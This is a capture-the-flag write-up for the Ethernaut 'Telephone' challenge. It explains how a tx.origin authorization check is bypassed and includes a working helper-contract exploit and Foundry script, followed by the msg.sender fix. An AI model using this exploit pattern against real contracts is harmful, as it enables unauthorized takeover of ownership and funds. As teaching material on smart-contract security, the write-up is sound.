# Ethernaut Level 4 – Telephone

## Overview

The objective of this challenge is to claim ownership of the Telephone 
contract by calling changeOwner() with the player address.

At first glance, the function appears protected by checking whether 
tx.origin differs from msg.sender. However, this check can be trivially 
bypassed by routing the call through an intermediate contract.

---

# Vulnerable Contract

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

---

# Root Cause

The contract relies on:

```solidity
tx.origin != msg.sender
```

as its authorization check.

This is **not a secure access control pattern**.

- `tx.origin` always returns the original EOA that initiated 
  the transaction chain — no matter how many contracts are 
  called in between
- `msg.sender` returns the immediate caller — which changes 
  at every call boundary

If the call goes through an intermediate contract:
- `tx.origin` = player wallet
- `msg.sender` = intermediate contract
- They differ → condition passes → ownership transferred

---

# Understanding the Check

Direct call from wallet:
tx.origin = wallet
msg.sender = wallet
tx.origin != msg.sender → FALSE → ownership NOT transferred

Call through intermediate contract:
tx.origin = wallet
msg.sender = intermediate contract
tx.origin != msg.sender → TRUE → ownership transferred


The check intended to protect ownership actually grants it 
to anyone who routes their call through any contract.

---

# Exploit

Deploy a helper contract that calls changeOwner() on behalf 
of the player. Since the call originates from the player wallet 
but passes through the helper contract, the condition is satisfied.

```solidity
contract HelperContract {
    function attack(Telephone _target, address _player) external {
        _target.changeOwner(_player);
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    HelperContract helper = new HelperContract();
    helper.attack(telephoneInstance, PLAYER_ADDRESS);

    vm.stopBroadcast();
}
```

---

# Call Chain

PLAYER_WALLET (tx.origin)
↓ calls
HelperContract.attack() ← msg.sender inside changeOwner
↓ calls
Telephone.changeOwner()
tx.origin = PLAYER_WALLET
msg.sender = HelperContract
tx.origin != msg.sender ✓
owner = PLAYER_ADDRESS ✓


---

# Security Impact

Using tx.origin for authorization is dangerous because:

- Any intermediate contract breaks the tx.origin == msg.sender 
  assumption trivially
- A malicious contract can trick a user into calling it, then 
  use tx.origin to pass auth checks in a victim contract
- This is the exact mechanism behind tx.origin phishing attacks

This pattern can completely break:
- Ownership controls
- Admin functions
- Withdrawal authorization
- Privileged protocol operations

---

# Recommended Mitigation

Never use tx.origin for authorization. Always use msg.sender.

```solidity
// Vulnerable
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}

// Secure
function changeOwner(address _owner) public {
    require(msg.sender == owner, "not owner");
    owner = _owner;
}
```

---

# Key Takeaways

- tx.origin always returns the original EOA regardless of call depth
- msg.sender changes at every contract boundary
- tx.origin != msg.sender is satisfied by any intermediate contract
- Never use tx.origin for access control
- Always authenticate with msg.sender

---

# Exploit Summary

```solidity
contract HelperContract {
    function attack(Telephone _target, address _player) external {
        _target.changeOwner(_player);
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    HelperContract helper = new HelperContract();
    helper.attack(telephoneInstance, PLAYER_ADDRESS);

    vm.stopBroadcast();
}
```

Route the call through HelperContract so that tx.origin 
(player wallet) differs from msg.sender (helper contract), 
satisfying the condition and transferring ownership.
